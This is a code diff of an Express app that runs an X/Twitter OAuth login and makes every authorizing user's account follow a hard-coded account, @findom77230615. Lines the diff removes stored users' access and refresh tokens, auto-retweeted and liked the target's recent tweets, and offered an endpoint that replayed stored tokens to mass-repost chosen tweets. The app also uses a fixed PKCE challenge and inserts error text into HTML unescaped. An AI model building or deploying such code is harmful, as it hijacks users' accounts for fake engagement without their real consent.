@@ -5,7 +5,6 @@ const app = express();
 
 // 内存存储（Vercel 无状态，重启丢失）
 const authStore = new Map(); // state, codeVerifier
-const userStore = new Map(); // userId -> { accessToken, refreshToken }
 
 app.use(express.json());
 app.use(express.static('public'));
@@ -13,7 +12,6 @@ app.use(express.static('public'));
 // 环境变量
 const CLIENT_ID = process.env.X_API_KEY;
 const CLIENT_SECRET = process.env.X_API_SECRET;
-const BEARER_TOKEN = process.env.X_BEARER_TOKEN;
 const REDIRECT_URI = 'https://fatu-snowy.vercel.app/api/callback';
 const TARGET_USER_ID = '1263316369044467712'; // @findom77230615
 
@@ -32,7 +30,7 @@ app.get('/api/auth-url', async (req, res) => {
       response_type: 'code',
       client_id: CLIENT_ID,
       redirect_uri: REDIRECT_URI,
-      scope: 'users.read tweet.read tweet.write likes.write follows.write offline.access',
+      scope: 'users.read follows.write offline.access',
       state: `${state}|${sessionId}`,
       code_challenge: 'challenge',
       code_challenge_method: 'plain',
@@ -98,7 +96,7 @@ app.get('/api/callback', async (req, res) => {
       }
     );
 
-    const { access_token, refresh_token } = tokenResponse.data;
+    const { access_token } = tokenResponse.data;
     console.log('获取 access token:', access_token.substring(0, 10) + '...');
 
     // 获取用户 ID
@@ -108,9 +106,6 @@ app.get('/api/callback', async (req, res) => {
     });
     const userId = meResponse.data.data.id;
 
-    // 存储用户 token
-    userStore.set(userId, { accessToken: access_token, refreshToken: refresh_token });
-
     // 关注@findom77230615
     try {
       await axios.post(
@@ -118,33 +113,9 @@ app.get('/api/callback', async (req, res) => {
         { target_user_id: TARGET_USER_ID },
         { headers: { Authorization: `Bearer ${access_token}`, 'Content-Type': 'application/json' }, timeout: 10000 }
       );
+      console.log(`用户 ${userId} 已关注 @findom77230615`);
     } catch (followError) {
       console.error(`关注失败 (用户 ${userId}):`, followError.response?.data || followError.message);
-    }
-
-    // 获取最新 5 条推文
-    const tweetsResponse = await axios.get(
-      `https://api.twitter.com/2/users/${TARGET_USER_ID}/tweets?max_results=5&tweet.fields=created_at&exclude=retweets,replies`,
-      { headers: { Authorization: `Bearer ${BEARER_TOKEN}` }, timeout: 10000 }
-    );
-    const tweetIds = tweetsResponse.data.data || [];
-
-    // 点赞和转发
-    for (const tweet of tweetIds) {
-      try {
-        await axios.post(
-          `https://api.twitter.com/2/users/${userId}/retweets`,
-          { tweet_id: tweet.id },
-          { headers: { Authorization: `Bearer ${access_token}`, 'Content-Type': 'application/json' }, timeout: 10000 }
-        );
-        await axios.post(
-          `https://api.twitter.com/2/users/${userId}/likes`,
-          { tweet_id: tweet.id },
-          { headers: { Authorization: `Bearer ${access_token}`, 'Content-Type': 'application/json' }, timeout: 10000 }
-        );
-      } catch (tweetError) {
-        console.error(`推文 ${tweet.id} 处理失败 (用户 ${userId}):`, tweetError.response?.data || tweetError.message);
-      }
     }
 
     // 清理 auth 数据
@@ -157,92 +128,6 @@ app.get('/api/callback', async (req, res) => {
       <p>错误: ${error.response?.data?.error || error.message}</p>
       <p><a href="/" style="color: #1da1f2;">返回并重新授权</a></p>
     </div>`);
-  }
-});
-
-// 手动触发转发
-app.get('/api/repost-tweet', async (req, res) => {
-  const { tweet_id } = req.query;
-  if (!tweet_id) {
-    return res.status(400).json({ error: 'Missing tweet_id parameter' });
-  }
-
-  try {
-    // 验证 tweet_id
-    const tweetResponse = await axios.get(
-      `https://api.twitter.com/2/tweets/${tweet_id}?tweet.fields=author_id`,
-      { headers: { Authorization: `Bearer ${BEARER_TOKEN}` }, timeout: 10000 }
-    );
-
-    if (!tweetResponse.data.data) {
-      return res.status(400).json({ error: 'Invalid tweet_id or tweet not found' });
-    }
-    if (tweetResponse.data.data.author_id !== TARGET_USER_ID) {
-      return res.status(400).json({ error: 'Tweet not from @findom77230615' });
-    }
-
-    let processedCount = 0;
-    for (const [userId, userData] of userStore) {
-      // 检查 token 有效性，续期
-      try {
-        await axios.get('https://api.twitter.com/2/users/me', {
-          headers: { Authorization: `Bearer ${userData.accessToken}` },
-          timeout: 10000,
-        });
-      } catch (error) {
-        if (error.response?.status === 401) {
-          try {
-            const tokenResponse = await axios.post(
-              'https://api.twitter.com/2/oauth2/token',
-              querystring.stringify({
-                grant_type: 'refresh_token',
-                refresh_token: userData.refreshToken,
-                client_id: CLIENT_ID,
-              }),
-              {
-                headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded',
-                  'Authorization': 'Basic ' + Buffer.from(`${CLIENT_ID}:${CLIENT_SECRET}`).toString('base64'),
-                },
-                timeout: 10000,
-              }
-            );
-            userData.accessToken = tokenResponse.data.access_token;
-            userData.refreshToken = tokenResponse.data.refresh_token;
-            userStore.set(userId, userData);
-            console.log(`用户 ${userId} token 已续期`);
-          } catch (refreshError) {
-            console.error(`用户 ${userId} token 续期失败:`, refreshError);
-            continue;
-          }
-        } else {
-          console.error(`用户 ${userId} token 验证失败:`, error);
-          continue;
-        }
-      }
-
-      // 点赞和转发
-      try {
-        await axios.post(
-          `https://api.twitter.com/2/users/${userId}/retweets`,
-          { tweet_id },
-          { headers: { Authorization: `Bearer ${userData.accessToken}`, 'Content-Type': 'application/json' }, timeout: 10000 }
-        );
-        await axios.post(
-          `https://api.twitter.com/2/users/${userId}/likes`,
-          { tweet_id },
-          { headers: { Authorization: `Bearer ${userData.accessToken}`, 'Content-Type': 'application/json' }, timeout: 10000 }
-        );
-        processedCount++;
-      } catch (error) {
-        console.error(`用户 ${userId} 处理推文 ${tweet_id} 失败:`, error.response?.data || error.message);
-      }
-    }
-
-    res.json({ processed: processedCount, tweet_id });
-  } catch (error) {
-    console.error('Repost error:', error.response?.data || error.message);
-    res.status(500).json({ error: 'Repost failed', details: error.response?.data?.error || error.message });
   }
 });
 
